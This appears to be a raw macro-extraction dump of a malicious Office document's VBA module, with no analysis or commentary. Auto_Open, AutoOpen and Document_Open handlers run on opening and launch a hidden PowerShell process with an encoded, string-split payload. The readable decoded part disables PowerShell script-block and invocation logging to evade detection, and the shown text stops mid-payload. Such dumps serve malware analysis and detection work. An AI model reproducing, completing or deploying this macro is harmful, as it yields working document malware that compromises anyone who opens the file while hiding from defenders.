Filename     : ./macros/a8422d1dd57c432a97ab908c739964efaa0d28b8344e1d6e3121930fe85a421c
OLE stream   : VBA/Module1
VBA filename : Module1.bas
----------------------------------------
Attribute VB_Name = "Module1"

Sub Auto_Open()
        Aw
End Sub

Sub AutoOpen()
        Aw
End Sub

Sub Document_Open()
        Aw
End Sub

Public Function Aw() As Variant
        Dim gTnC As String
        gTnC = "powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVg"
        gTnC = gTnC + "BlAHIAUwBJAG8ATgBUAEEAYgBsAGUALgBQAFMAVgBFAHIAcwBJ"
        gTnC = gTnC + "AG8ATgAuAE0AYQBKAE8AUgAgAC0AZwBFACAAMwApAHsAJABHAF"
        gTnC = gTnC + "AARgA9AFsAUgBFAEYAXQAuAEEAUwBTAEUAbQBiAGwAWQAuAEcA"
        gTnC = gTnC + "RQBUAFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQ"
        gTnC = gTnC + "BnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBV"
        gTnC = gTnC + "AHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAEkAZQBgAEwAZAAiAC"
        gTnC = gTnC + "gAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkA"
        gTnC = gTnC + "UwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQ"
        gTnC = gTnC + "BiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABH"
        gTnC = gTnC + "AFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAVABWAE"
        gTnC = gTnC + "EAbAB1AEUAKAAkAE4AdQBsAGwAKQA7AEkARgAoACQARwBQAEMA"
        gTnC = gTnC + "WwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZw"
        gTnC = gTnC + "BnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBw"
        gTnC = gTnC + "AHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAF"
        gTnC = gTnC + "sAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwA"
        gTnC = gTnC + "bwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQw"
        gTnC = gTnC + "BbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBn"
        gTnC = gTnC + "AGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAH"
        gTnC = gTnC + "AAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8A"
        gTnC = gTnC + "ZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAYQBMAD0AWwBDAG8AbA"
        gTnC = gTnC + "BsAGUAQwB0AEkAbwBuAHMALgBHAGUAbgBlAFIASQBDAC4ARABp"
        gTnC = gTnC + "AGMAdABpAG8AbgBhAHIAWQBbAHMAVABSAEkAbgBnACwAUwB5AH"
        gTnC = gTnC + "MAdABFAE0ALgBPAGIASgBFAEMAVABdAF0AOgA6AG4ARQBXACgA"
        gTnC = gTnC + "KQA7ACQAVgBhAGwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUw"
        gTnC = gTnC + "BjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBu"
        gTnC = gTnC + "AGcAJwAsADAAKQA7ACQAVgBhAEwALgBBAEQARAAoACcARQBuAG"
        gTnC = gTnC + "EAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8A"
        gTnC = gTnC + "YwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJA"
